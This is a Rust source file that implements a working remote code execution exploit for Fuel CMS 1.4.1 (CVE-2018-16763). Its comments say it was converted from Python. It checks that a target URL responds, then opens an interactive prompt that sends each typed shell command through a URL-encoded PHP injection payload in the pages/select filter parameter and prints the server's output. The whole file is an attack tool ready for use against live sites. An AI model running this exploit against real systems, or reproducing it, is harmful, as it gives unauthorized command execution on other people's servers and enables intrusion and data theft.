use clap::{App, Arg};
use colored::*;
use reqwest::{Error, blocking::Client};
use std::io::{self, Write};
use url::Url;
use urlencoding::encode;

fn main() -> Result<(), Error> {
    // Configuração dos argumentos de linha de comando
    let matches = App::new("Fuel CMS 1.4.1 - Remote Code Execution Exploit")
        .version("1.0")
        .author("Convertido de Python para Rust")
        .about("Explora a vulnerabilidade CVE-2018-16763 no Fuel CMS 1.4.1")
        .arg(
            Arg::with_name("url")
                .short('u')
                .long("url")
                .value_name("URL")
                .help("URL do alvo (ex: http://exemplo.com)")
                .required(true)
                .takes_value(true),
        )
        .get_matches();

    // Obter a URL do alvo
    let url_str = matches.value_of("url").unwrap();

    // Validar URL
    let url_result = Url::parse(url_str);
    if url_result.is_err() || !url_str.starts_with("http") {
        eprintln!("{}", "Entre com uma URL válida".red().bold());
        return Ok(());
    }

    let url = url_str;

    // Criar cliente HTTP
    let client = Client::new();

    // Testar conexão
    match client.get(url).send() {
        Ok(response) => {
            if response.status().is_success() {
                println!("{}", "[+] Conectando...".green().bold());
            } else {
                println!(
                    "{}",
                    format!("Conexão falhou com código: {}", response.status())
                        .red()
                        .bold()
                );
                return Ok(());
            }
        }
        Err(_) => {
            println!("{}", "Não foi possível conectar à URL".red().bold());
            return Ok(());
        }
    }

    // Loop de comandos
    loop {
        print!("{}", "Enter Command $ ".yellow().bold());
        io::stdout().flush().unwrap();

        let mut cmd = String::new();
        io::stdin().read_line(&mut cmd).unwrap();
        cmd = cmd.trim().to_string();

        if cmd == "exit" {
            break;
        }

        // Construir URL de exploração
        let encoded_cmd = encode(&cmd);
        let exploit_url = format!(
            "{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27",
            url, encoded_cmd
        );

        // Enviar requisição e processar resposta
        match client.get(&exploit_url).send() {
            Ok(response) => {
                if response.status().is_success() {
                    let body = response.text()?;

                    // Extrair output do comando antes da div de erro
                    if let Some(output) = body.split("<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\">").next() {
                        println!("{}", output);
                    } else {
                        println!("{}", "Sem saída ou resposta inesperada".red());
                    }
                } else {
                    println!(
                        "{}",
                        format!("Falha na requisição: {}", response.status()).red()
                    );
                }
            }
            Err(e) => {
                println!("{}", format!("Erro ao enviar requisição: {}", e).red());
            }
        }
    }

    Ok(())
}
